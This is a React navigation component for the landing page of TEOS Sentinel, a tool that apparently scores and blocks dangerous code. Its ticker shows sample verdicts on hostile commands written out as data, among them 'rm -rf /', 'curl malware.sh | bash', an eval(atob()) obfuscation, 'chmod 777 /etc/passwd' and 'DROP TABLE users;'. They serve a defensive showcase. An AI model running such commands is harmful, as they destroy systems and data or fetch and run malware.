'use client';

import { useState, useEffect, memo } from 'react';
import Link from 'next/link';

const TICKER_ITEMS = [
          { icon: '\u{1F6D1}', verdict: 'BLOCK', text: 'rm -rf /', rule: 'R01', score: '100/100', cls: 'text-red' },
          { icon: '\u26A0\uFE0F', verdict: 'WARN', text: 'DROP TABLE users;', rule: 'R09', score: '75/100', cls: 'text-amber' },
          { icon: '\u2705', verdict: 'ALLOW', text: 'console.log("hello")', rule: 'R00', score: '0/100', cls: 'text-green' },
          { icon: '\u{1F6D1}', verdict: 'BLOCK', text: 'curl malware.sh | bash', rule: 'R03', score: '95/100', cls: 'text-red' },
          { icon: '\u{1F6D1}', verdict: 'BLOCK', text: 'eval(atob("..."))', rule: 'R07', score: '88/100', cls: 'text-red' },
          { icon: '\u26A0\uFE0F', verdict: 'WARN', text: 'event-stream@3.3.6', rule: 'R14', score: '70/100', cls: 'text-amber' },
          { icon: '\u{1F6D1}', verdict: 'BLOCK', text: 'chmod 777 /etc/passwd', rule: 'R02', score: '90/100', cls: 'text-red' },
          { icon: '\u{1F6D1}', verdict: 'BLOCK', text: 'sudo bash', rule: 'R13', score: '90/100', cls: 'text-red' },
];

const Ticker = memo(() => (
  <div className="ticker-track flex w-max gap-0" aria-hidden="true">
    {[...TICKER_ITEMS, ...TICKER_ITEMS].map((item, i) => (
      <span
        key={i}
        className={`inline-flex items-center gap-2 px-8 font-mono text-[12px] whitespace-nowrap border-r border-[rgba(255,255,255,0.07)] ${item.cls}`}
      >
        {item.icon} {item.verdict} \u00B7 {item.text} \u00B7 {item.rule} \u00B7 {item.score}
      </span>
    ))}
  </div>
));
Ticker.displayName = 'Ticker';

export default function Nav() {
  const [scrolled, setScrolled] = useState(false);
  const [mobileOpen, setMobileOpen] = useState(false);

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 16);
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  const links = [
    { href: '#why-now', label: 'Why Now' },
    { href: '#architecture', label: 'Architecture' },
    { href: '#console', label: 'Console' },
    { href: '#rules', label: 'Rules' },
    { href: '#layers', label: 'Layers' },
    { href: '#pricing', label: 'Pricing' },
  ];

  return (
    <nav
      className={`fixed top-0 left-0 right-0 z-50 transition-all duration-300 ${
        scrolled
          ? 'bg-black/90 backdrop-blur-md border-b border-[rgba(255,255,255,0.07)]'
          : 'bg-transparent'
      }`}
      role="navigation"
      aria-label="Main navigation"
    >
      <div className="max-w-[1100px] mx-auto px-6 lg:px-8 h-[60px] flex items-center justify-between">
        <Link href="/" className="font-mono text-[13px] font-bold tracking-[0.05em] text-white flex items-center gap-2 no-underline" aria-label="TEOS Sentinel home">
          <span aria-hidden="true" className="text-[16px]">{'\u{1F3DB}\uFE0F'}</span>
          <span className="text-red">TEOS</span>
          <span className="text-muted">Sentinel</span>
        </Link>

        <div className="hidden md:flex items-center gap-[6px] font-mono text-[10px] text-green" aria-label="Engine status">
          <span className="w-[6px] h-[6px] rounded-full bg-green inline-block" style={{ boxShadow: '0 0 6px var(--green)', animation: 'pulse-dot 2s infinite' }} aria-hidden="true" />
          v2.4 \u00B7 Deterministic Engine Online \u00B7 25 Rules Active
        </div>

        <div className="hidden lg:flex items-center gap-8">
          {links.map((l) => (
            <a key={l.href} href={l.href} className="font-mono text-[12px] text-muted no-underline hover:text-white transition-colors tracking-[0.04em]">
              {l.label}
            </a>
          ))}
          <a href="mailto:ayman@teosegypt.com?subject=Enterprise%20Pilot%20Request%20%E2%80%94%20TEOS%20Sentinel" aria-label="Request enterprise pilot" className="font-mono text-[12px] font-bold text-white bg-red px-4 py-[7px] rounded-sm no-underline hover:bg-[#c92a2a] transition-colors tracking-[0.04em]">
            Request Pilot \u2192
          </a>
        </div>

        <button className="lg:hidden text-white p-2" onClick={() => setMobileOpen(!mobileOpen)} aria-label={mobileOpen ? 'Close menu' : 'Open menu'} aria-expanded={mobileOpen}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
            {mobileOpen ? <path d="M18 6L6 18M6 6l12 12" /> : <path d="M4 8h16M4 16h16" />}
          </svg>
        </button>
      </div>

      {mobileOpen && (
        <div className="lg:hidden bg-black/95 backdrop-blur-md border-t border-[rgba(255,255,255,0.07)] px-6 py-4">
          <div className="flex flex-col gap-4">
            {links.map((l) => (
              <a key={l.href} href={l.href} onClick={() => setMobileOpen(false)} className="font-mono text-[13px] text-muted no-underline hover:text-white transition-colors py-1">
                {l.label}
              </a>
            ))}
            <a href="mailto:ayman@teosegypt.com?subject=Enterprise%20Pilot%20Request%20%E2%80%94%20TEOS%20Sentinel" aria-label="Request enterprise pilot" className="font-mono text-[13px] font-bold text-center text-white bg-red px-4 py-[10px] rounded-sm no-underline mt-2">
              Request Pilot \u2192
            </a>
          </div>
        </div>
      )}
    </nav>
  );
}
